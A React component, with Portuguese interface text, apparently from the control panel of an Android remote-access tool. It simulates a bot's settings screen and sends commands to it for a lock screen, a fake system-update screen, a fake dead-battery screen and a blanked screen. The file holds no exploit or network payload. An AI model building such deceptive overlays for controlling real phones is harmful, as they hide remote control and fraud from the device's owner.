import React, { useState } from 'react';
import type { Bot } from '../types';
import { StorageService } from '../services/storage';

interface LiveScreenProps {
  bot: Bot;
}

export const LiveScreen: React.FC<LiveScreenProps> = ({ bot }) => {
  const [selectedNode, setSelectedNode] = useState<string | null>(null);

  // Nodes extracted from dump.xml
  const screenNodes = [
    { id: '1', title: 'Status Bar', bounds: { left: 0, top: 0, width: 1080, height: 76 }, info: 'class: android.view.View, package: com.android.settings, resource-id: android:id/statusBarBackground' },
    { id: '2', title: 'Samsung Account Profile Card', bounds: { left: 0, top: 934, width: 1080, height: 212 }, info: 'text: Samsung account, class: android.widget.LinearLayout, summary: Profile  •  Security  •  Apps' },
    { id: '3', title: 'Menu Item: Connections', bounds: { left: 0, top: 1198, width: 1080, height: 196 }, info: 'text: Connections, class: android.widget.LinearLayout, summary: Wi-Fi  •  Bluetooth  •  Flight mode' },
    { id: '4', title: 'Menu Item: Sounds and vibration', bounds: { left: 0, top: 1446, width: 1080, height: 196 }, info: 'text: Sounds and vibration, class: android.widget.LinearLayout, summary: Sound mode  •  Ringtone' },
    { id: '5', title: 'Menu Item: Notifications', bounds: { left: 0, top: 1642, width: 1080, height: 196 }, info: 'text: Notifications, class: android.widget.LinearLayout, summary: Status bar  •  Do not disturb' },
    { id: '6', title: 'Menu Item: Display', bounds: { left: 0, top: 1890, width: 1080, height: 196 }, info: 'text: Display, class: android.widget.LinearLayout, summary: Brightness  •  Eye comfort shield' },
    { id: '7', title: 'Search Settings Button', bounds: { left: 956, top: 765, width: 124, height: 147 }, info: 'class: android.widget.Button, content-desc: Search settings' }
  ];

  const handleNodeClick = (info: string) => {
    setSelectedNode(info);
    StorageService.addLog('info', `Clique de nó inspecionado: ${info.split(',')[0]}`, bot.id, bot.name);
  };

  const handleCommand = (state: Bot['screenState']) => {
    StorageService.changeScreenState(bot.id, state);
  };

  // Convert 1080x2198 coordinates to fit inside our responsive scaling container (approx 300x610)
  const scaleX = 296 / 1080;
  const scaleY = 616 / 2198;

  return (
    <div style={{ display: 'flex', gap: '24px', flexWrap: 'wrap', padding: '16px' }}>
      
      {/* Phone Simulator Frame */}
      <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '12px' }}>
        <div className="android-sim-device">
          
          {/* Internal Screen Area */}
          <div className="android-sim-screen">
            
            {/* Screen State Overlays */}
            {bot.screenState === 'locked' && (
              <div style={{
                position: 'absolute', inset: 0, background: 'rgba(0,0,0,0.92)', color: 'white',
                display: 'flex', flexDirection: 'column', justifyContent: 'center', alignItems: 'center',
                zIndex: 10, padding: '24px', textAlign: 'center', fontFamily: 'sans-serif'
              }}>
                <span style={{ fontSize: '48px', marginBottom: '16px' }}>🔒</span>
                <h4 style={{ fontSize: '18px', fontWeight: 'bold', marginBottom: '8px' }}>Aparelho Bloqueado</h4>
                <p style={{ fontSize: '12px', color: 'var(--text-secondary)' }}>
                  A tela física do celular foi travada pelo painel administrativo.
                </p>
              </div>
            )}

            {bot.screenState === 'black' && (
              <div style={{
                position: 'absolute', inset: 0, background: '#000000', color: '#111',
                display: 'flex', justifyContent: 'center', alignItems: 'center', zIndex: 10
              }}>
                <span style={{ fontSize: '12px' }}>TELA APAGADA</span>
              </div>
            )}

            {bot.screenState === 'update' && (
              <div style={{
                position: 'absolute', inset: 0, background: '#000000', color: 'white',
                display: 'flex', flexDirection: 'column', justifyContent: 'center', alignItems: 'center',
                zIndex: 10, padding: '20px', textAlign: 'center', fontFamily: 'sans-serif'
              }}>
                <div style={{ width: '40px', height: '40px', border: '3px solid rgba(255,255,255,0.2)', borderTopColor: 'var(--accent-purple)', borderRadius: '50%', animation: 'spin 1s linear infinite', marginBottom: '20px' }}></div>
                <h4 style={{ fontSize: '16px', fontWeight: '500', marginBottom: '10px' }}>Instalando atualização do sistema...</h4>
                <p style={{ fontSize: '12px', color: '#888' }}>Não desligue o dispositivo ou remova a bateria até a conclusão.</p>
                <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
              </div>
            )}

            {bot.screenState === 'battery_dead' && (
              <div style={{
                position: 'absolute', inset: 0, background: '#07070a', color: '#ef4444',
                display: 'flex', flexDirection: 'column', justifyContent: 'center', alignItems: 'center',
                zIndex: 10, padding: '20px', textAlign: 'center', fontFamily: 'sans-serif'
              }}>
                <span style={{ fontSize: '48px', color: '#ef4444', marginBottom: '16px' }}>🪫</span>
                <h4 style={{ fontSize: '16px', fontWeight: 'bold', color: 'white', marginBottom: '8px' }}>Bateria Descarregada</h4>
                <p style={{ fontSize: '12px', color: '#888' }}>Conecte o carregador para ligar o aparelho.</p>
              </div>
            )}

            {/* Base Android Interface Simulation (Settings Layout from dump.xml) */}
            <div style={{ width: '100%', height: '100%', position: 'relative', background: '#f4f5f7', color: '#1f2937', padding: '8px' }}>
              
              {/* Android top bar */}
              <div style={{ display: 'flex', justifyContent: 'space-between', padding: '4px 8px', fontSize: '11px', color: '#6b7280', borderBottom: '1px solid #e5e7eb' }}>
                <span>10:15</span>
                <div style={{ display: 'flex', gap: '6px' }}>
                  <span>📶 5G</span>
                  <span>🔋 {bot.battery}%</span>
                </div>
              </div>

              {/* Title Section */}
              <div style={{ padding: '24px 12px 12px 12px' }}>
                <h3 style={{ fontSize: '24px', fontWeight: '500', color: '#111827' }}>Configurações</h3>
              </div>

              {/* Samsung account mock card */}
              <div style={{ background: 'white', margin: '8px', padding: '12px', borderRadius: '12px', display: 'flex', justifyContent: 'space-between', alignItems: 'center', border: '1px solid #e5e7eb' }}>
                <div>
                  <div style={{ fontWeight: '600', color: '#111827', fontSize: '13px' }}>Samsung account</div>
                  <div style={{ color: '#6b7280', fontSize: '11px', marginTop: '2px' }}>Profile • Security • Apps</div>
                </div>
                <div style={{ width: '32px', height: '32px', borderRadius: '50%', background: '#e5e7eb' }} />
              </div>

              {/* Settings list scroll list */}
              <div style={{ display: 'flex', flexDirection: 'column', gap: '8px', padding: '8px' }}>
                <div style={{ background: 'white', padding: '12px', borderRadius: '12px', display: 'flex', gap: '12px', alignItems: 'center', border: '1px solid #e5e7eb' }}>
                  <span style={{ fontSize: '16px' }}>📶</span>
                  <div>
                    <div style={{ fontWeight: '500', fontSize: '13px' }}>Conexões</div>
                    <div style={{ fontSize: '10px', color: '#6b7280' }}>Wi-Fi • Bluetooth • Rede Móvel</div>
                  </div>
                </div>

                <div style={{ background: 'white', padding: '12px', borderRadius: '12px', display: 'flex', gap: '12px', alignItems: 'center', border: '1px solid #e5e7eb' }}>
                  <span style={{ fontSize: '16px' }}>🔊</span>
                  <div>
                    <div style={{ fontWeight: '500', fontSize: '13px' }}>Sons e vibração</div>
                    <div style={{ fontSize: '10px', color: '#6b7280' }}>Modo de som • Toque</div>
                  </div>
                </div>

                <div style={{ background: 'white', padding: '12px', borderRadius: '12px', display: 'flex', gap: '12px', alignItems: 'center', border: '1px solid #e5e7eb' }}>
                  <span style={{ fontSize: '16px' }}>🔔</span>
                  <div>
                    <div style={{ fontWeight: '500', fontSize: '13px' }}>Notificações</div>
                    <div style={{ fontSize: '10px', color: '#6b7280' }}>Barra de status • Não perturbe</div>
                  </div>
                </div>

                <div style={{ background: 'white', padding: '12px', borderRadius: '12px', display: 'flex', gap: '12px', alignItems: 'center', border: '1px solid #e5e7eb' }}>
                  <span style={{ fontSize: '16px' }}>🖥️</span>
                  <div>
                    <div style={{ fontWeight: '500', fontSize: '13px' }}>Visor</div>
                    <div style={{ fontSize: '10px', color: '#6b7280' }}>Brilho • Proteção ocular</div>
                  </div>
                </div>
              </div>

              {/* Renders invisible node layers overlay for inspection */}
              {screenNodes.map(node => (
                <div
                  key={node.id}
                  className="android-node-highlight"
                  style={{
                    left: `${node.bounds.left * scaleX}px`,
                    top: `${node.bounds.top * scaleY}px`,
                    width: `${node.bounds.width * scaleX}px`,
                    height: `${node.bounds.height * scaleY}px`,
                  }}
                  title={node.title}
                  onClick={() => handleNodeClick(node.info)}
                />
              ))}

            </div>

          </div>

          {/* Home/Back Bottom Buttons Mock */}
          <div style={{ height: '36px', background: '#09090b', display: 'flex', justifyContent: 'space-around', alignItems: 'center', padding: '0 40px' }}>
            <span style={{ color: '#6b7280', fontSize: '14px', cursor: 'pointer' }}>◀</span>
            <span style={{ color: '#6b7280', fontSize: '16px', cursor: 'pointer' }}>●</span>
            <span style={{ color: '#6b7280', fontSize: '12px', cursor: 'pointer' }}>■</span>
          </div>

        </div>
        <span style={{ fontSize: '12px', color: 'var(--text-secondary)' }}>Inspecione nós clicando na tela do celular</span>
      </div>

      {/* Side Command controls panel */}
      <div style={{ flex: 1, display: 'flex', flexDirection: 'column', gap: '16px', minWidth: '280px' }}>
        
        {/* Node inspector panel */}
        <div className="glass-panel" style={{ padding: '20px' }}>
          <h4 style={{ fontSize: '16px', fontWeight: '600', marginBottom: '12px' }}>Inspecionador de Layout</h4>
          {selectedNode ? (
            <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
              <div style={{ background: 'var(--bg-primary)', padding: '12px', borderRadius: '6px', fontSize: '13px', fontFamily: 'var(--font-mono)', border: '1px solid var(--border-color)', wordBreak: 'break-all' }}>
                {selectedNode}
              </div>
              <button className="btn btn-secondary" onClick={() => setSelectedNode(null)} style={{ alignSelf: 'flex-end', padding: '4px 10px', fontSize: '12px' }}>
                Limpar inspeção
              </button>
            </div>
          ) : (
            <p style={{ color: 'var(--text-muted)', fontSize: '13px' }}>Clique em qualquer caixa azul clara na simulação da tela para ver suas propriedades de acessibilidade xml.</p>
          )}
        </div>

        {/* Command buttons overlay tool */}
        <div className="glass-panel" style={{ padding: '20px', display: 'flex', flexDirection: 'column', gap: '12px' }}>
          <h4 style={{ fontSize: '16px', fontWeight: '600' }}>Telas de Bloqueio & Overlays</h4>
          <p style={{ fontSize: '12px', color: 'var(--text-secondary)', marginBottom: '8px' }}>Envie comandos de renderização de telas remotas para o bot ativo:</p>
          
          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '8px' }}>
            <button 
              className="btn btn-secondary"
              onClick={() => handleCommand(bot.screenState === 'locked' ? 'unlocked' : 'locked')}
              style={{
                background: bot.screenState === 'locked' ? 'var(--danger)' : 'var(--bg-tertiary)',
                borderColor: bot.screenState === 'locked' ? 'var(--danger)' : 'var(--border-color)',
                color: 'white',
                padding: '10px'
              }}
            >
              {bot.screenState === 'locked' ? '🔓 Destravar Tela' : '🔒 Travar Aparelho'}
            </button>

            <button 
              className="btn btn-secondary"
              onClick={() => handleCommand(bot.screenState === 'update' ? 'unlocked' : 'update')}
              style={{
                background: bot.screenState === 'update' ? 'var(--accent-purple)' : 'var(--bg-tertiary)',
                borderColor: bot.screenState === 'update' ? 'var(--accent-purple)' : 'var(--border-color)',
                color: 'white',
                padding: '10px'
              }}
            >
              🔄 System Update
            </button>

            <button 
              className="btn btn-secondary"
              onClick={() => handleCommand(bot.screenState === 'battery_dead' ? 'unlocked' : 'battery_dead')}
              style={{
                background: bot.screenState === 'battery_dead' ? 'var(--warning)' : 'var(--bg-tertiary)',
                borderColor: bot.screenState === 'battery_dead' ? 'var(--warning)' : 'var(--border-color)',
                color: 'white',
                padding: '10px'
              }}
            >
              🪫 Bateria Morta
            </button>

            <button 
              className="btn btn-secondary"
              onClick={() => handleCommand(bot.screenState === 'black' ? 'unlocked' : 'black')}
              style={{
                background: bot.screenState === 'black' ? 'var(--text-primary)' : 'var(--bg-tertiary)',
                borderColor: bot.screenState === 'black' ? 'var(--text-primary)' : 'var(--border-color)',
                color: bot.screenState === 'black' ? 'black' : 'white',
                padding: '10px'
              }}
            >
              🕶️ Tela Apagada
            </button>
          </div>
          
          <div style={{ borderTop: '1px solid var(--border-color)', paddingTop: '10px', marginTop: '4px', fontSize: '11px', color: 'var(--text-muted)' }}>
            Estado atual do bot: <strong style={{ color: 'var(--text-primary)' }}>{bot.screenState.toUpperCase()}</strong>
          </div>
        </div>

      </div>

    </div>
  );
};
